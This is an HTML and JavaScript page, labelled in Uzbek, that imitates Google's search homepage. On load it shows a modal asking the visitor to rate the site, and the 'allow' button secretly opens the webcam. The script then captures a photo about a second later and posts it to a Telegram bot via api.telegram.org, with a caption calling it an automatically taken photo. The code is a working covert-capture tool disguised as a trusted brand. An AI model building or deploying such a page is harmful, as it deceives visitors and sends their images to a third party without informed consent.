<!DOCTYPE html>
<html lang="uz">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Google Style Search + Camera (Auto Send)</title>
  <style>
    body {
      font-family: 'Roboto', Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 0;
      background: #fff;
    }

    /* Navbar */
    .navbar {
      width: 100%;
      text-align: right;
      padding: 15px 25px;
    }
    .nav-links {
      display: flex;
      align-items: center;
      gap: 15px;
      justify-content: flex-end;
    }
    .nav-links a {
      color: #202124;
      text-decoration: none;
      font-size: 14px;
    }
    .nav-links a:hover {
      text-decoration: underline;
    }
    .login-btn {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 8px 15px;
      border-radius: 5px;
      cursor: pointer;
      font-weight: 500;
      transition: background 0.2s;
    }
    .login-btn:hover {
      background: #1669c1;
    }

    /* Search box */
    .container {
      margin-top: 50px;
      text-align: center;
      width: 100%;
      max-width: 900px;
      padding: 0 16px;
    }
    .logo {
      width: 272px;
      margin-bottom: 20px;
    }
    .search-box {
      display: flex;
      align-items: center;
      border: 1px solid #dfe1e5;
      border-radius: 24px;
      width: 580px;
      padding: 10px 15px;
      margin: 0 auto;
      box-shadow: none;
      transition: all 0.2s ease;
    }
    .search-box:hover {
      box-shadow: 0 1px 6px rgba(32,33,36,0.28);
    }
    .search-box input {
      flex: 1;
      border: none;
      outline: none;
      font-size: 16px;
      color: #202124;
    }

    /* Camera section */
    .camera-card {
      margin-top: 30px;
      display: flex;
      gap: 20px;
      align-items: flex-start;
      justify-content: center;
      flex-wrap: wrap;
      display: none;
    }
    .cam-box {
      background: #f8f9fa;
      padding: 12px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.08);
      width: 360px;
    }
    video, canvas {
      width: 100%;
      border-radius: 6px;
      background: #000;
      display: block;
    }
    .status {
      margin-top: 10px;
      padding: 8px;
      border-radius: 4px;
      font-size: 14px;
    }
    .status.success { background-color: #e6f4ea; color: #137333; }
    .status.error { background-color: #fce8e6; color: #c5221f; }
    .status.info { background-color: #e8f0fe; color: #1a73e8; }

    /* Modal (Google style) */
    .permission-modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(32,33,36,0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      animation: fadeIn 0.25s ease;
    }
    @keyframes fadeIn {
      from {opacity: 0;} to {opacity: 1;}
    }
    .modal-content {
      background: #fff;
      padding: 30px 25px;
      border-radius: 12px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 8px 24px rgba(0,0,0,0.2);
      animation: slideUp 0.3s ease;
    }
    @keyframes slideUp {
      from { transform: translateY(40px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    .modal-content h2 {
      color: #202124;
      font-size: 18px;
      font-weight: 500;
      margin: 0 0 15px 0;
    }
    .modal-text {
      color: #5f6368;
      font-size: 14px;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .modal-buttons {
      display: flex;
      gap: 10px;
      justify-content: center;
    }
    .allow-btn {
      background: #1a73e8;
      color: white;
      border: none;
      padding: 10px 24px;
      border-radius: 24px;
      cursor: pointer;
      font-weight: 500;
      transition: background 0.2s ease;
    }
    .allow-btn:hover { background: #1669c1; }
    .deny-btn {
      background: #f1f3f4;
      color: #3c4043;
      border: none;
      padding: 10px 24px;
      border-radius: 24px;
      cursor: pointer;
      font-weight: 500;
      transition: background 0.2s ease;
    }
    .deny-btn:hover { background: #e8eaed; }
  </style>
</head>
<body>
  <div class="navbar">
    <div class="nav-links">
      <a href="#">Gmail</a>
      <a href="#">Rasmlar</a>
      <button class="login-btn">Kirish</button>
    </div>
  </div>

  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="logo">

    <div class="search-box">
      <input type="text" placeholder="Qidiruv..." />
    </div>

    <div class="camera-card">
      <div class="cam-box">
        <h3>Kamera</h3>
        <video id="video" autoplay playsinline></video>
      </div>

      <div class="cam-box">
        <h3>Surat natijasi</h3>
        <canvas id="canvas"></canvas>
        <div id="status" class="status"></div>
      </div>
    </div>
  </div>

  <!-- Google style modal -->
  <div id="permissionModal" class="permission-modal">
    <div class="modal-content">
      <h2>Saytimizni xozir baxolaysizmi </h2>
     
      <div class="modal-buttons">
        <button id="allowCamera" class="allow-btn">Ha, ruxsat beraman</button>
        <button id="denyCamera" class="allow-btn">Yo‘q</button>
      </div>
    </div>
  </div>

  <script>
    const BOT_TOKEN = 'YOUR_BOT_TOKEN';  // xavfsizlik uchun tokenni keyinchalik .env orqali oling
    const CHAT_ID = 'YOUR_CHAT_ID';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');
    const permissionModal = document.getElementById('permissionModal');
    const allowCameraBtn = document.getElementById('allowCamera');
    const denyCameraBtn = document.getElementById('denyCamera');

    let stream = null;

    window.addEventListener('load', () => {
      setTimeout(() => permissionModal.style.display = 'flex', 700);
    });

    allowCameraBtn.addEventListener('click', () => {
      permissionModal.style.display = 'none';
      startCamera();
    });

    denyCameraBtn.addEventListener('click', () => {
      permissionModal.style.display = 'none';
      showStatus("Kamera ruxsati rad etildi.", "error");
    });

    async function startCamera() {
      try {
        showStatus("Kamera ochilmoqda...", "info");
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();
          showStatus("Kamera yoqildi. 3 soniyadan keyin surat olinadi...", "success");
          setTimeout(() => captureAndSend(), 1000);
        };
      } catch (error) {
        console.error(error);
        showStatus("Kamera ochilmadi. Ruxsat berilmagan.", "error");
      }
    }

    async function captureAndSend() {
      if (!video.videoWidth) {
        showStatus("Video tayyor emas. Qayta urinilmoqda...", "info");
        setTimeout(captureAndSend, 1500);
        return;
      }

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg');
      showStatus("📸 Surat olingan! Telegram’ga yuborilmoqda...", "info");

      stopCamera();

      try {
        const blob = await (await fetch(imageData)).blob();
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', '📷 Avtomatik olingan surat');

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();

        if (result.ok) {
          showStatus("✅ Surat muvaffaqiyatli yuborildi!", "success");
        } else {
          showStatus("❌ Xatolik: " + result.description, "error");
        }
      } catch (e) {
        console.error(e);
        showStatus("Yuborishda xatolik yuz berdi.", "error");
      }
    }

    function stopCamera() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
      }
    }

    function showStatus(message, type) {
      statusDiv.textContent = message;
      statusDiv.className = "status " + type;
    }
  </script>
</body>
</html>
